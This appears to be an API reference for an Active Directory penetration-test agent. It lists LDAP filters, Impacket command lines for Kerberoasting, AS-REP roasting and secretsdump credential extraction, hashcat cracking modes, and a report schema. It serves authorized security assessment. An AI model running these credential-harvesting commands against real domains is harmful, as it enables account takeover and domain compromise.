# Active Directory Penetration Test - API Reference

## ldap3 Library

### Connection
```python
from ldap3 import Server, Connection, ALL, SUBTREE
server = Server("ldaps://dc.example.com", get_info=ALL, use_ssl=True)
conn = Connection(server, user="DOMAIN\\user", password="pass", auto_bind=True)
```

### Key LDAP Queries

| Purpose | Filter |
|---------|--------|
| All users | `(&(objectClass=user)(objectCategory=person))` |
| Users with SPNs | `(&(objectClass=user)(servicePrincipalName=*))` |
| AS-REP Roastable | `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` |
| Domain admins | `(&(objectClass=group)(cn=Domain Admins))` |
| Password policy | `(objectClass=domain)` |

### UserAccountControl Flags

| Flag | Hex | Test |
|------|-----|------|
| ACCOUNTDISABLE | 0x0002 | Account disabled |
| PASSWD_NOTREQD | 0x0020 | No password required |
| DONT_EXPIRE_PASSWORD | 0x10000 | Password never expires |
| DONT_REQ_PREAUTH | 0x400000 | No Kerberos pre-auth |

## Impacket Tools

### GetUserSPNs (Kerberoasting)
```bash
python3 -m impacket.examples.GetUserSPNs DOMAIN/user:pass -dc-ip 10.0.0.1 -request
```

### GetNPUsers (AS-REP Roasting)
```bash
python3 -m impacket.examples.GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 10.0.0.1
```

### secretsdump (Credential Extraction)
```bash
python3 -m impacket.examples.secretsdump DOMAIN/admin:pass@10.0.0.1
```

## Attack Techniques

### Kerberoasting
1. Enumerate users with SPNs via LDAP
2. Request TGS tickets for those SPNs
3. Extract ticket hashes
4. Crack offline with hashcat (mode 13100)

### AS-REP Roasting
1. Find accounts with pre-auth disabled
2. Request AS-REP without authentication
3. Extract encrypted part of AS-REP
4. Crack offline with hashcat (mode 18200)

### Password Policy Weaknesses
- Min length < 12 characters
- No account lockout threshold
- No password history enforcement
- Password never expires on service accounts

## Output Schema

```json
{
  "report": "ad_penetration_test",
  "domain_info": {"default_naming_context": "DC=example,DC=com"},
  "total_users": 500,
  "total_findings": 12,
  "severity_summary": {"critical": 1, "high": 8, "medium": 3}
}
```

## CLI Usage

```bash
python agent.py --server ldaps://dc.example.com --username "DOMAIN\\user" --password "pass" --output report.json
```
